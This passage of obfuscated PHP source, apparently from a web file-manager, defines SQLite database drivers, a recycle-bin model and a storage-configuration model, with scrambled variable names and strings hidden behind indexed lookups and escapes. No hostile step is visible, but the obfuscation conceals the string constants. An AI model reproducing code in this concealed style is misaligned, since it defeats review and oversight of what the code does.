$µÀÓÔÅÚ[$ú¦úˆÜá + 1]; $this->in[$µÀÓÔÅÚ[$ú¦úˆÜá]] = $µÀÓÔÅÚ[$ú¦úˆÜá + 1]; } return $óâ­‡Æ; } protected function assign($ï€¸°…”, $Ä›ùØµ¾) { $this->values[$ï€¸°…”] = $Ä›ùØµ¾; } protected function display($õ‘ß÷Ú) { ob_end_clean(); extract($this->values); require $this->tpl . $õ‘ß÷Ú; } } class DbSqliteBase extends Db { public function __construct($ÜË­©şü = '') { $­ØÃìÖ› =& $_SERVER[Ì¥ŞÒ°£]; if (!extension_loaded($­ØÃìÖ›[13])) { think_exception(think_lang($­ØÃìÖ›[14]) . $­ØÃìÖ›[15]); } if (!empty($ÜË­©şü)) { if (!isset($ÜË­©şü[$­ØÃìÖ›[16]])) { $ÜË­©şü[$­ØÃìÖ›[16]] = 438; } $this->config = $ÜË­©şü; if (empty($this->config[$­ØÃìÖ›[17]])) { $this->config[$­ØÃìÖ›[17]] = array(); } } } public function connect($é‰ÜÆ› = '', $ÊŠ“œê = 0) { $’àşş˜ =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($this->linkID[$ÊŠ“œê])) { if (empty($é‰ÜÆ›)) { $é‰ÜÆ› = $this->config; } $‚´¤»êß = !empty($é‰ÜÆ›[$’àşş˜[17]][$’àşş˜[18]]) ? $é‰ÜÆ›[$’àşş˜[17]][$’àşş˜[18]] : $this->pconnect; $¤åçÕÃ½ = $‚´¤»êß ? $’àşş˜[19] : $’àşş˜[20]; $this->linkID[$ÊŠ“œê] = $¤åçÕÃ½($é‰ÜÆ›[$’àşş˜[21]], $é‰ÜÆ›[$’àşş˜[16]]); if (!$this->linkID[$ÊŠ“œê]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ÊŠ“œê], 30000); if (1 != think_config($’àşş˜[22])) { unset($this->config); } } return $this->linkID[$ÊŠ“œê]; } public function free() { $this->queryID = null; } public function query($ÛÀš—½¢) { $«½Ş¢Æ =& $_SERVER[Ì¥ŞÒ°£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÛÀš—½¢; if ($this->queryID) { $this->free(); } think_action_status($«½Ş¢Æ[23], 1); think_status($«½Ş¢Æ[24]); $this->queryID = sqlite_query($this->_linkID, $ÛÀš—½¢); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $›î‚‘çŠ = $this->getAll(); return $›î‚‘çŠ; } } public function execute($Êº¥ŞÂá) { $†¾œ“‚‘ =& $_SERVER[Ì¥ŞÒ°£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Êº¥ŞÂá; if ($this->queryID) { $this->free(); } think_action_status($†¾œ“‚‘[25], 1); think_status($†¾œ“‚‘[24]); $â°Ö±³ = sqlite_exec($this->_linkID, $Êº¥ŞÂá); $this->debug(); if (!1 === $â°Ö±³) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ì¥ŞÒ°£][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $†Î€«í = sqlite_query($this->_linkID, $_SERVER[Ì¥ŞÒ°£][27]); if (!$†Î€«í) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $§¥„¶àì = sqlite_query($this->_linkID, $_SERVER[Ì¥ŞÒ°£][28]); if (!$§¥„¶àì) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $÷û•¿Öø = array(); if ($this->numRows > 0) { for ($É«ÌÍÅ‰ = 0; $É«ÌÍÅ‰ < $this->numRows; $É«ÌÍÅ‰++) { $÷û•¿Öø[$É«ÌÍÅ‰] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $÷û•¿Öø; } public function getFields($¦¡ˆÍë¦) { $Õ°¼Èšˆ =& $_SERVER[Ì¥ŞÒ°£]; $Ãá–¥áĞ = $this->query($Õ°¼Èšˆ[29] . $¦¡ˆÍë¦ . $Õ°¼Èšˆ[30]); $—ô€¡²ğ = array(); if ($Ãá–¥áĞ) { foreach ($Ãá–¥áĞ as $°£â´÷­ => $Õ¢Î•Æ) { $—ô€¡²ğ[$Õ¢Î•Æ[$Õ°¼Èšˆ[31]]] = array($Õ°¼Èšˆ[32] => $Õ¢Î•Æ[$Õ°¼Èšˆ[31]], $Õ°¼Èšˆ[33] => $Õ¢Î•Æ[$Õ°¼Èšˆ[34]], $Õ°¼Èšˆ[35] => (bool) ($Õ¢Î•Æ[$Õ°¼Èšˆ[36]] === $Õ°¼Èšˆ[12]), $Õ°¼Èšˆ[37] => $Õ¢Î•Æ[$Õ°¼Èšˆ[38]], $Õ°¼Èšˆ[39] => strtolower($Õ¢Î•Æ[$Õ°¼Èšˆ[40]]) == $Õ°¼Èšˆ[41], $Õ°¼Èšˆ[42] => strtolower($Õ¢Î•Æ[$Õ°¼Èšˆ[43]]) == $Õ°¼Èšˆ[44]); } } return $—ô€¡²ğ; } public function getTables($ÇÊâøÌÑ = '') { $¡Ï³Î‡ =& $_SERVER[Ì¥ŞÒ°£]; $ü×·†¤Å = $this->query($¡Ï³Î‡[45] . $¡Ï³Î‡[46] . $¡Ï³Î‡[47]); $‚»°Ë½ = array(); foreach ($ü×·†¤Å as $ªì¯¢á  => $²ŸªˆÒĞ) { $‚»°Ë½[$ªì¯¢á ] = current($²ŸªˆÒĞ); } return $‚»°Ë½; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $•§ãÕ¢ª =& $_SERVER[Ì¥ŞÒ°£]; $™ş§Éæ… = sqlite_last_error($this->_linkID); $this->error = $™ş§Éæ… . $•§ãÕ¢ª[4] . sqlite_error_string($™ş§Éæ…); if ($•§ãÕ¢ª[12] != $this->queryStr) { $this->error .= LNG($•§ãÕ¢ª[48]) . $this->queryStr; } think_trace($this->error, $•§ãÕ¢ª[12], $•§ãÕ¢ª[49]); return $this->error; } public function escapeString($† Ãì) { return sqlite_escape_string($† Ãì); } public function parseLimit($’æşª†¢) { $äÕ¥Óô =& $_SERVER[Ì¥ŞÒ°£]; $ø†ªˆ”µ = $äÕ¥Óô[12]; if (!empty($’æşª†¢)) { $’æşª†¢ = explode($äÕ¥Óô[50], $’æşª†¢); if (count($’æşª†¢) > 1) { $ø†ªˆ”µ .= $äÕ¥Óô[51] . $’æşª†¢[1] . $äÕ¥Óô[52] . $’æşª†¢[0] . $äÕ¥Óô[53]; } else { $ø†ªˆ”µ .= $äÕ¥Óô[51] . $’æşª†¢[0] . $äÕ¥Óô[53]; } } return $ø†ªˆ”µ; } } class DbSqlite3Base extends Db { public function __construct($Ò¿ŠÎƒñ = '') { $Ÿƒè©Áş =& $_SERVER[Ì¥ŞÒ°£]; if (!class_exists($Ÿƒè©Áş[54])) { think_exception(think_lang($Ÿƒè©Áş[14]) . $Ÿƒè©Áş[55]); } if (!empty($Ò¿ŠÎƒñ)) { if (!isset($Ò¿ŠÎƒñ[$Ÿƒè©Áş[16]])) { $Ò¿ŠÎƒñ[$Ÿƒè©Áş[16]] = 438; } $this->config = $Ò¿ŠÎƒñ; if (empty($this->config[$Ÿƒè©Áş[17]])) { $this->config[$Ÿƒè©Áş[17]] = array(); } } } public function connect($áâ°ç­ = '', $î¸‚˜Ãø = 0) { $ñØÑ«ËÀ =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($this->linkID[$î¸‚˜Ãø])) { if (empty($áâ°ç­)) { $áâ°ç­ = $this->config; } $this->linkID[$î¸‚˜Ãø] = new SQLite3($áâ°ç­[$ñØÑ«ËÀ[21]]); if (!$this->linkID[$î¸‚˜Ãø]) { think_exception($this->linkID[$î¸‚˜Ãø]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$î¸‚˜Ãø]->busyTimeout(30000); if (1 != think_config($ñØÑ«ËÀ[22])) { unset($this->config); } } return $this->linkID[$î¸‚˜Ãø]; } public function free() { $this->queryID = null; } public function query($è™¥¦«) { $£†ÖÅ– =& $_SERVER[Ì¥ŞÒ°£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $è™¥¦«; if ($this->queryID) { $this->free(); } think_action_status($£†ÖÅ–[23], 1); think_status($£†ÖÅ–[24]); $this->queryID = $this->_linkID->query($è™¥¦«); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ä„Òíò¦ = $this->getAll(); $this->numRows = count($ä„Òíò¦); return $ä„Òíò¦; } } public function execute($’££´¬ä) { $‹ƒïºŠû =& $_SERVER[Ì¥ŞÒ°£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $’££´¬ä; if ($this->queryID) { $this->free(); } think_action_status($‹ƒïºŠû[25], 1); think_status($‹ƒïºŠû[24]); $—€ÛÓ•ê = $this->_linkID->exec($’££´¬ä); $this->debug(); if (!1 === $—€ÛÓ•ê) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ì¥ŞÒ°£][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $šÑñÅ¿Ø = $this->_linkID->query($_SERVER[Ì¥ŞÒ°£][27]); if (!$šÑñÅ¿Ø) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÑâÃ†Ó = $this->_linkID->query($_SERVER[Ì¥ŞÒ°£][28]); if (!$ÑâÃ†Ó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $‚Ñ²ûÜ = array(); while ($ßŸëÛ¡š = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $‚Ñ²ûÜ[] = $ßŸëÛ¡š; } $this->queryID->reset(); return $‚Ñ²ûÜ; } public function getFields($‘İ¯·ˆ) { $ğº¢¦Õ =& $_SERVER[Ì¥ŞÒ°£]; $ÜŸ©ø»ù = $this->query($ğº¢¦Õ[29] . $‘İ¯·ˆ . $ğº¢¦Õ[30]); $ÔôğÉÁ = array(); if ($ÜŸ©ø»ù) { foreach ($ÜŸ©ø»ù as $ÑùõŠè÷ => $×›ÎØÈ) { $ÔôğÉÁ[$×›ÎØÈ[$ğº¢¦Õ[32]]] = array($ğº¢¦Õ[32] => $×›ÎØÈ[$ğº¢¦Õ[32]], $ğº¢¦Õ[33] => $×›ÎØÈ[$ğº¢¦Õ[33]], $ğº¢¦Õ[35] => (bool) ($×›ÎØÈ[$ğº¢¦Õ[35]] === $ğº¢¦Õ[12]), $ğº¢¦Õ[37] => $×›ÎØÈ[$ğº¢¦Õ[56]], $ğº¢¦Õ[39] => (bool) $×›ÎØÈ[$ğº¢¦Õ[57]], $ğº¢¦Õ[42] => (bool) $×›ÎØÈ[$ğº¢¦Õ[57]]); } } return $ÔôğÉÁ; } public function getTables($¯²ˆò­Š = '') { $ï½ğÈø› =& $_SERVER[Ì¥ŞÒ°£]; $‚ÊşÂÑÏ = $this->query($ï½ğÈø›[45] . $ï½ğÈø›[46] . $ï½ğÈø›[47]); $³„‘™Ë = array(); foreach ($‚ÊşÂÑÏ as $‡‚¾¶âÏ => $òŠõ„) { $³„‘™Ë[$‡‚¾¶âÏ] = current($òŠõ„); } return $³„‘™Ë; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ˆÀÅ´ƒ• =& $_SERVER[Ì¥ŞÒ°£]; $this->error = $this->_linkID->lastErrorMsg(); if ($ˆÀÅ´ƒ•[12] != $this->queryStr) { $this->error .= LNG($ˆÀÅ´ƒ•[48]) . $this->queryStr; } think_trace($this->error, $ˆÀÅ´ƒ•[12], $ˆÀÅ´ƒ•[49]); return $this->error; } public function escapeString($˜ÒÃ) { $†ˆ‰­Çì =& $_SERVER[Ì¥ŞÒ°£]; if ($this->_linkID) { return $this->_linkID->escapeString($˜ÒÃ); } return str_ireplace($†ˆ‰­Çì[58], $†ˆ‰­Çì[59], $˜ÒÃ); } public function parseLimit($¶Øğ££·) { $û†õ–™ê =& $_SERVER[Ì¥ŞÒ°£]; $Œ÷ÛûĞÃ = $û†õ–™ê[12]; if (!empty($¶Øğ££·)) { $¶Øğ££· = explode($û†õ–™ê[50], $¶Øğ££·); if (count($¶Øğ££·) > 1) { $Œ÷ÛûĞÃ .= $û†õ–™ê[51] . $¶Øğ££·[1] . $û†õ–™ê[52] . $¶Øğ££·[0] . $û†õ–™ê[53]; } else { $Œ÷ÛûĞÃ .= $û†õ–™ê[51] . $¶Øğ££·[0] . $û†õ–™ê[53]; } } return $Œ÷ÛûĞÃ; } } goto B¯Õßì©®; a¸¸ñ‰Ê™Š: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\x72\143\145\137\162\145\143\x79\x63\154\145"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\x54\x69\x6d\x65", "\x74\x69\155\145", "\151\156\163\x65\x72\x74", "\146\x75\x6e\x63\x74\x69\157\x6e")); public function listData($ËÀ‘¯‚Ó = false) { $³œÖƒŸû =& $_SERVER[Ì¥ŞÒ°£]; $ËÀ‘¯‚Ó = $ËÀ‘¯‚Ó ? $ËÀ‘¯‚Ó : USER_ID; $ÍŞÈ™Ò = $this->where(array($³œÖƒŸû[1658] => $ËÀ‘¯‚Ó))->select(); return array_to_keyvalue($ÍŞÈ™Ò, $³œÖƒŸû[12], $³œÖƒŸû[402]); } public function moveToRecycle($¦Ÿ ª®Š) { $ò»”Ø¤‹ =& $_SERVER[Ì¥ŞÒ°£]; $ÓÅëëû = Model($ò»”Ø¤‹[1341]); $š„Ô = $ÓÅëëû->sourceInfo($¦Ÿ ª®Š); if (!$š„Ô || $š„Ô[$ò»”Ø¤‹[431]] == $ò»”Ø¤‹[88]) { return; } $³ÊŸ²· = array($ò»”Ø¤‹[417] => $¦Ÿ ª®Š, $ò»”Ø¤‹[1658] => USER_ID, $ò»”Ø¤‹[586] => $š„Ô[$ò»”Ø¤‹[411]], $ò»”Ø¤‹[587] => $š„Ô[$ò»”Ø¤‹[505]], $ò»”Ø¤‹[590] => $š„Ô[$ò»”Ø¤‹[521]]); $this->add($³ÊŸ²·); $this->recycleMove($¦Ÿ ª®Š, 1); if ($š„Ô[$ò»”Ø¤‹[410]] == $ò»”Ø¤‹[88]) { $“½·˜“ö = array($ò»”Ø¤‹[590] => array($ò»”Ø¤‹[550], $š„Ô[$ò»”Ø¤‹[521]] . $¦Ÿ ª®Š . $ò»”Ø¤‹[551])); $ÓÅëëû->where($“½·˜“ö)->setField($ò»”Ø¤‹[431], 1); } } public function clear() { $this->remove(!1); } public function remove($éÇÑ¨ø« = false, $¿¸ÔÓùŞ = false) { $âö¨¸İ =& $_SERVER[Ì¥ŞÒ°£]; $¿¸ÔÓùŞ = $¿¸ÔÓùŞ ? $¿¸ÔÓùŞ : USER_ID; $ËÙäñÖ = Model($âö¨¸İ[1341]); $û„„à¿à = $this->listData($¿¸ÔÓùŞ); $éÇÑ¨ø« = $éÇÑ¨ø« === !1 ? !1 : $éÇÑ¨ø«; $§‡‡ÚÑß = array(); foreach ($û„„à¿à as $¬„½‹Ò‡) { if ($éÇÑ¨ø« != !1 && !in_array($¬„½‹Ò‡, $éÇÑ¨ø«)) { continue; } $óÚíèûú = $ËÙäñÖ->sourceInfo($¬„½‹Ò‡); $ËÙäñÖ->remove($¬„½‹Ò‡, !1); $à™§û† = $óÚíèûú[$âö¨¸İ[411]] . $âö¨¸İ[11] . $óÚíèûú[$âö¨¸İ[505]]; $§‡‡ÚÑß[$à™§û†] = array($âö¨¸İ[586] => $óÚíèûú[$âö¨¸İ[411]], $âö¨¸İ[505] => $óÚíèûú[$âö¨¸İ[505]]); $this->where(array($âö¨¸İ[402] => $¬„½‹Ò‡))->delete(); } foreach ($§‡‡ÚÑß as $ÕšÏæåİ) { $ËÙäñÖ->targetSpaceUpdate($ÕšÏæåİ[$âö¨¸İ[411]], $ÕšÏæåİ[$âö¨¸İ[505]]); } } public function restore($ÜË¨Æ¥Ú = false) { $àñ–Ö‹ü = $this->listData(); $this->_restoreSource($àñ–Ö‹ü, $ÜË¨Æ¥Ú); } public function removeUserAll($…ª¦èÙ) { $this->remove(!1, $…ª¦èÙ); } private function _restoreSource($Äùó˜Âö, $ÆË‰€¢‚) { $ùÍ†Ê•Ñ =& $_SERVER[Ì¥ŞÒ°£]; $“ùÆíë¢ = Model($ùÍ†Ê•Ñ[1341]); $ÆË‰€¢‚ = $ÆË‰€¢‚ == !1 ? !1 : $ÆË‰€¢‚; if (!$Äùó˜Âö) { return !0; } $¡“îá¿ = array(); foreach ($Äùó˜Âö as $ªŠí©Åõ) { if ($ÆË‰€¢‚ != !1 && !in_array($ªŠí©Åõ, $ÆË‰€¢‚)) { continue; } $Ë­”Şöï = $“ùÆíë¢->sourceInfo($ªŠí©Åõ); $ı¸Îší­ = $“ùÆíë¢->sourceInfo($Ë­”Şöï[$ùÍ†Ê•Ñ[432]]); if ($ı¸Îší­[$ùÍ†Ê•Ñ[431]] == $ùÍ†Ê•Ñ[88]) { continue; } $“ùÆíë¢->lockMoveStart($ªŠí©Åõ); $this->recycleMove($ªŠí©Åõ, 0); if ($Ë­”Şöï[$ùÍ†Ê•Ñ[410]] == $ùÍ†Ê•Ñ[88]) { $öÎ¬ó¶ó = array($ùÍ†Ê•Ñ[590] => array($ùÍ†Ê•Ñ[550], $Ë­”Şöï[$ùÍ†Ê•Ñ[521]] . $ªŠí©Åõ . $ùÍ†Ê•Ñ[551])); $“ùÆíë¢->where($öÎ¬ó¶ó)->setField($ùÍ†Ê•Ñ[431], 0); $this->restoreFolderChildren($ªŠí©Åõ, $Äùó˜Âö); } $this->where(array($ùÍ†Ê•Ñ[402] => $ªŠí©Åõ))->delete(); $“ùÆíë¢->folderSizeReset($Ë­”Şöï[$ùÍ†Ê•Ñ[432]]); $¡“îá¿[] = $Ë­”Şöï[$ùÍ†Ê•Ñ[432]]; if ($Ë­”Şöï[$ùÍ†Ê•Ñ[410]] == $ùÍ†Ê•Ñ[88]) { $¡“îá¿[] = $ªŠí©Åõ; } $“ùÆíë¢->lockMoveEnd($ªŠí©Åõ); } $“ùÆíë¢->updateModifyTime($¡“îá¿); } private function restoreFolderChildren($…ÎÕ¬İ, $Â‘°èğ´) { $õóÑôü =& $_SERVER[Ì¥ŞÒ°£]; $İàµ¸â› = Model($õóÑôü[1341]); $óİß‡…ü = array($õóÑôü[402] => array($õóÑôü[7], array())); foreach ($Â‘°èğ´ as $Â±Å©„”) { if ($Â±Å©„” == $…ÎÕ¬İ) { continue; } if (!$İàµ¸â›->isParentOf($…ÎÕ¬İ, $Â±Å©„”)) { continue; } $ŸƒÜ¯Ù = $İàµ¸â›->sourceInfo($Â±Å©„”); if ($ŸƒÜ¯Ù[$õóÑôü[410]] == $õóÑôü[88]) { $óİß‡…ü[] = array($õóÑôü[590] => array($õóÑôü[550], $ŸƒÜ¯Ù[$õóÑôü[521]] . $Â±Å©„” . $õóÑôü[551])); } else { $óİß‡…ü[$õóÑôü[402]][1][] = $Â±Å©„”; } } if (!$óİß‡…ü[$õóÑôü[402]][1]) { unset($óİß‡…ü[$õóÑôü[402]]); } if (!$óİß‡…ü) { return; } $óİß‡…ü[$õóÑôü[402]][1] = array_unique($óİß‡…ü[$õóÑôü[402]][1]); $óİß‡…ü[$õóÑôü[1005]] = $õóÑôü[1955]; $İàµ¸â›->where($óİß‡…ü)->setField($õóÑôü[431], 1); } private function recycleMove($²›ØóªÕ, $À‰„ƒ€ = 1) { $ë©ú‚à =& $_SERVER[Ì¥ŞÒ°£]; $î¯ÄóÖ× = Model($ë©ú‚à[1341]); $Õ’óÃóş = Model($ë©ú‚à[2166]); $‡¾Ğ”¡ƒ = array($ë©ú‚à[402] => $²›ØóªÕ); if ($À‰„ƒ€) { $î¯ÄóÖ×->where($‡¾Ğ”¡ƒ)->setField($ë©ú‚à[431], 1); $Õ’óÃóş->eventRecycle($²›ØóªÕ, $ë©ú‚à[2167]); } else { $³…«íæÁ = $î¯ÄóÖ×->where($‡¾Ğ”¡ƒ)->find(); $Ó¤¿¡ÇÈ = $³…«íæÁ[$ë©ú‚à[410]] == $ë©ú‚à[88]; $ğÈôùå· = $î¯ÄóÖ×->fileNameAuto($³…«íæÁ[$ë©ú‚à[432]], $³…«íæÁ[$ë©ú‚à[32]], REPEAT_RENAME_FOLDER, $Ó¤¿¡ÇÈ); if ($ğÈôùå· != $³…«íæÁ[$ë©ú‚à[32]]) { $î¯ÄóÖ×->rename($²›ØóªÕ, $ğÈôùå·); } $î¯ÄóÖ×->where($‡¾Ğ”¡ƒ)->setField($ë©ú‚à[431], 0); $Õ’óÃóş->eventRecycle($²›ØóªÕ, $ë©ú‚à[2168]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\163\x6f\165\x72\143\x65\123\x65\143\x72\145\164\114\151\x73\164"; public $field = array("\163\157\x75\162\143\x65\x49\x44", "\x74\x79\x70\x65\x49\104", "\x63\x72\x65\141\164\145\125\x73\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\x73\164\157\162\x61\147\145\x4c\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\163\151\x7a\x65\115\141\x78", "\163\x79\x73\164\145\155", "\144\145\x66\x61\165\x6c\x74", "\144\162\x69\x76\145\x72", "\x63\157\x6e\146\x69\x67"); public function listData($á¶˜Ë«Â = false, $ìäÅå°» = "\x6d\157\144\151\146\x79\124\x69\x6d\x65", $¢ñÒí³ª = false) { $á™èùÏ½ =& $_SERVER[Ì¥ŞÒ°£]; $Ûı’‹–´ = parent::listData($á¶˜Ë«Â, $ìäÅå°», $¢ñÒí³ª); if ($á¶˜Ë«Â) { return $Ûı’‹–´; } $ÊÀŠéÃ© = $this->ioSizeUseGet(array_to_keyvalue($Ûı’‹–´, $á™èùÏ½[12], $á™èùÏ½[399])); foreach ($Ûı’‹–´ as $ÔéåõÌ‘ => $ÁßÙ) { unset($Ûı’‹–´[$ÔéåõÌ‘][$á™èùÏ½[6]]); $Ûı’‹–´[$ÔéåõÌ‘][$á™èùÏ½[1846]] = isset($ÊÀŠéÃ©[$ÁßÙ[$á™èùÏ½[399]]]) ? $ÊÀŠéÃ©[$ÁßÙ[$á™èùÏ½[399]]] : 0; } return $Ûı’‹–´; } public function ioSizeUseGet($ÒœŞ„±) { $çç¤‡ù¡ =& $_SERVER[Ì¥ŞÒ°£]; if (!$ÒœŞ„±) { return array(); } $ëÛ‡ºÕÉ = $çç¤‡ù¡[2169] . implode($çç¤‡ù¡[50], $ÒœŞ„±); $ĞîÚ‘ÎÍ = Cache::get($ëÛ‡ºÕÉ); if ($ĞîÚ‘ÎÍ) { return $ĞîÚ‘ÎÍ; } $‚öŞó®í = array($çç¤‡ù¡[819] => $çç¤‡ù¡[399], $çç¤‡ù¡[2170] => $çç¤‡ù¡[76]); $‰¦Ë–Çô = array($çç¤‡ù¡[819] => array($çç¤‡ù¡[7], $ÒœŞ„±)); $ĞîÚ‘ÎÍ = Model($çç¤‡ù¡[791])->field($‚öŞó®í)->where($‰¦Ë–Çô)->group($çç¤‡ù¡[819])->select(); $ĞîÚ‘ÎÍ = array_to_keyvalue($ĞîÚ‘ÎÍ, $çç¤‡ù¡[399], $çç¤‡ù¡[76]); Cache::set($ëÛ‡ºÕÉ, $ĞîÚ‘ÎÍ, 600); return $ĞîÚ‘ÎÍ; } public function getConfig($Ø‘Ë¸¦õ) { $úµà•ïû = parent::listData($Ø‘Ë¸¦õ); return json_decode($úµà•ïû[$_SERVER[Ì¥ŞÒ°£][6]], !0); } public function update($ì¾õÔğÛ, $‰ŠÄÙùÆ) { $»“Ó¿±Ø =& $_SERVER[Ì¥ŞÒ°£]; $‰•òøÊí = $‰ŠÄÙùÆ[$»“Ó¿±Ø[32]]; $âÜşğŞ = array_to_keyvalue(parent::listData(), $»“Ó¿±Ø[32]); if (isset($âÜşğŞ[$‰•òøÊí]) && $âÜşğŞ[$‰•òøÊí][$»“Ó¿±Ø[399]] != $ì¾õÔğÛ) { return !1; } $this->checkPwd($ì¾õÔğÛ, $‰ŠÄÙùÆ); if (isset($‰ŠÄÙùÆ[$»“Ó¿±Ø[2171]]) && $‰ŠÄÙùÆ[$»“Ó¿±Ø[2171]] == $»“Ó¿±Ø[88]) { $this->checkConfig($‰ŠÄÙùÆ); } unset($‰ŠÄÙùÆ[$»“Ó¿±Ø[2171]]); $™˜üÎ† = parent::update($ì¾õÔğÛ, $‰ŠÄÙùÆ); if ($™˜üÎ† && $‰ŠÄÙùÆ[$»“Ó¿±Ø[37]]) { $ñÀÀ¶ó = 0; foreach ($âÜşğŞ as $Şš“æÀ) { if ($Şš“æÀ[$»“Ó¿±Ø[37]] && $Şš“æÀ[$»“Ó¿±Ø[399]] != $ì¾õÔğÛ) { $ñÀÀ¶ó = $Şš“æÀ[$»“Ó¿±Ø[399]]; parent::update($Şš“æÀ[$»“Ó¿±Ø[399]], array($»“Ó¿±Ø[37] => 0)); } } $this->updateBackup($ì¾õÔğÛ, $ñÀÀ¶ó); } return $™˜üÎ†; } public function add($ç‘“ó¶â) { $ƒ‰¿â²Ê =& $_SERVER[Ì¥ŞÒ°£]; $µËˆ‡é = array_to_keyvalue(parent::listData(), $ƒ‰¿â²Ê[32]); if (isset($µËˆ‡é[$ç‘“ó¶â[$ƒ‰¿â²Ê[32]]])) { return !1; } $this->checkConfig($ç‘“ó¶â); $¹®à—   = parent::insert($ç‘“ó¶â); if ($¹®à—   && $ç‘“ó¶â[$ƒ‰¿â²Ê[37]]) { foreach ($µËˆ‡é as $‰‡…Õ¢ú) { if ($‰‡…Õ¢ú[$ƒ‰¿â²Ê[37]]) { parent::update($‰‡…Õ¢ú[$ƒ‰¿â²Ê[399]], array($ƒ‰¿â²Ê[37] => 0)); } } } return $¹®à—  ; } public function updateBackup($ïºéÁ„Ò, $Ş”ÒìÀú) { $€ğùÍò =& $_SERVER[Ì¥ŞÒ°£]; if (!$Ş”ÒìÀú) { return; } $»®˜Ôæ² = Model($€ğùÍò[751])->config(); if ($»®˜Ôæ²[$€ğùÍò[1637]] != $€ğùÍò[88] || $»®˜Ôæ²[$€ğùÍò[754]] != $Ş”ÒìÀú) { return; } $ÈŠıÔÏç = Model($€ğùÍò[772])->get($€ğùÍò[782]); $ÈŠıÔÏç = json_decode($ÈŠıÔÏç, !0); if (!$ÈŠıÔÏç) { return; } $ÈŠıÔÏç[$€ğùÍò[754]] = $ïºéÁ„Ò; Model($€ğùÍò[772])->set(array($€ğùÍò[782] => $ÈŠıÔÏç)); } public function checkPwd($¿ĞÕÌäî, &$Æ³œÒ·Å) { $‰½òç­ =& $_SERVER[Ì¥ŞÒ°£]; if (empty($Æ³œÒ·Å[$‰½òç­[6]])) { return; } $ÚÏ½İ¥ã = json_decode($Æ³œÒ·Å[$‰½òç­[6]], !0); $úÍ´èÖ÷ = $‰½òç­[12]; $Â‡í«ù = array($‰½òç­[2172], $‰½òç­[2173], $‰½òç­[892]); foreach ($Â‡í«ù as $ìµóÕİç) { if (isset($ÚÏ½İ¥ã[$ìµóÕİç])) { $úÍ´èÖ÷ = $ìµóÕİç; break; } } if (!$úÍ´èÖ÷) { return; } $©€Ñê˜‰ = $this->getConfig($¿ĞÕÌäî); $çí¥¢ë’ = $©€Ñê˜‰[$úÍ´èÖ÷]; $Å£à¨¨ = $ÚÏ½İ¥ã[$úÍ´èÖ÷]; if ($Å£à¨¨ == str_repeat($‰½òç­[188], strlen($çí¥¢ë’))) { $ÚÏ½İ¥ã[$úÍ´èÖ÷] = $çí¥¢ë’; $Æ³œÒ·Å[$‰½òç­[6]] = json_encode($ÚÏ½İ¥ã); } else { if ($Å£à¨¨ != $çí¥¢ë’) { $Æ³œÒ·Å[$‰½òç­[2171]] = $‰½òç­[88]; } } } public function checkConfig(&$ğäòİ‘¿, $™î™ºáÉ = false) { $Êµ‡º»‚ =& $_SERVER[Ì¥ŞÒ°£]; $êŒÌãµ = strtolower($ğäòİ‘¿[$Êµ‡º»‚[95]]); $¬Í¿Øóô = json_decode($ğäòİ‘¿[$Êµ‡º»‚[6]], !0); foreach ($¬Í¿Øóô as $Äìì×Ñ” => $ôù£ˆ£‘) { $¬Í¿Øóô[$Äìì×Ñ”] = trim($ôù£ˆ£‘); } $¬Í¿Øóô[$Êµ‡º»‚[2174]] = rand_string(6); $²ñË‹ş¤ = $GLOBALS[$Êµ‡º»‚[6]][$Êµ‡º»‚[89]][$Êµ‡º»‚[828]]; $ãŠª¯á• = isset($²ñË‹ş¤[$êŒÌãµ]) ? $²ñË‹ş¤[$êŒÌãµ] : ucfirst($êŒÌãµ); $å›òîÚâ = $Êµ‡º»‚[74] . $ãŠª¯á•; if (!$ãŠª¯á• || !class_exists($å›òîÚâ)) { if ($™î™ºáÉ) { return LNG($Êµ‡º»‚[2175]); } write_log(array($Êµ‡º»‚[2176], $ğäòİ‘¿, get_caller_info()), $Êµ‡º»‚[2177]); show_json(LNG($Êµ‡º»‚[2175]), !1, $ğäòİ‘¿); } $‡¸ï¤Â = new $å›òîÚâ($¬Í¿Øóô); if (in_array($êŒÌãµ, $‡¸ï¤Â->objectDriver)) { if 